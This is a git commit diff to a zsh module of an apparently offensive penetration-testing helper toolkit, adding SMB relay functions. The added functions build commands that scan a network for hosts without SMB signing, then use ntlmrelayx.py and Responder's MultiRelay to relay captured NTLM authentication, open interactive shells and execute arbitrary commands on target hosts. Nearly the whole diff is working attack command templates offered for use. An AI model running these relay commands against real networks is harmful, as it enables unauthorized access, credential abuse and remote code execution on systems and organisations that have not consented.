bdf00234a808118cd83b9891f42ca8b951db63f9
Twilight4 <electrolight071@proton.me>
2024-06-01 10:44:17 +0200

    update

--- modules/nb-ad-smb.zsh
+++ modules/nb-ad-smb.zsh
@@ -58,6 +58,15 @@ nb-enum-smb-responder                spoof and get responses using responder
 nb-enum-smb-net-use-null             print a net use statement for windows
 nb-enum-smb-nbtscan                  scan a local network 
 
+SMB Relay
+---------
+nb-ad-smb-relay-install              installs dependencies
+nb-ad-smb-relay-enum                 identify hosts without smb signing
+nb-ad-smb-relay-ntlmrelay            relay the captured SMB requests by responder
+nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
+nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using ntlmrelayx.py
+nb-ad-smb-relay-multirelay-command   responder's alternative to ntlmrelayx.py - execute a shell command on a target host
+
 DOC
 }
 
@@ -430,4 +439,64 @@ nb-enum-smb-null-rpcclient() {
   __check-project
   nb-vars-set-rhost
   print -z "rpcclient -U \"\" ${__RHOST}"
+}
+
+nb-ad-smb-relay-enum() {
+    __check-project
+  	nb-vars-set-network
+
+    print -z "grc nmap --script=smb2-security-mode -p 445 ${__NETWORK} -oA $(netadpath)/nmap-smb-security"
+}
+
+nb-ad-smb-relay-ntlmrelay() {
+    __check-project
+
+    __ask "Did you disable SMB in /etc/responder/Responder.conf? (y/n)"
+	  local sm && __askvar sm SMB_OPTION
+    if [[ $sm == "n" ]]; then
+      __err "First disable SMB in /etc/responder/Responder.conf."
+      __info "sudo nvim /etc/responder/Responder.conf"
+      exit 1
+    fi
+
+    __ask "Did you first run responder? (y/n)"
+	  local rp && __askvar rp RESPONDER
+
+    if [[ $rp == "n" ]]; then
+      __err "Run first responder to relay the smb request"
+      __info "nb-enum-smb-responder"
+      exit 1
+    fi
+
+	  __ask "Enter a targets list file"
+	  local targets && __askvar targets TARGETS
+
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee $(__domadpath)/ntlmrelayx.txt"
+}
+
+nb-ad-smb-relay-ntlmrelay-shell() {
+    __check-project
+	  __ask "Enter a targets list file"
+	  local targets && __askvar targets TARGETS
+
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(__domadpath)/ntlmrelayx-shell.txt"
+}
+
+nb-ad-smb-relay-ntlmrelay-command() {
+    __check-project
+	  __ask "Enter a targets list file"
+	  local targets && __askvar targets TARGETS
+	  local cm && __askvar cm COMMAND
+
+	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c '$cm' | tee $(__domadpath)/ntlmrelayx-command.txt"
+}
+
+nb-ad-smb-relay-multirelay-command() {
+    __check-project
+	  __ask "Enter the IP address of the target DC server"
+	  nb-vars-set-rhost
+	  __ask "Enter a shell command to execute"
+	  local command && __askvar command COMMAND
+
+	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(__domadpath)/responder-multirelay.txt"
 }
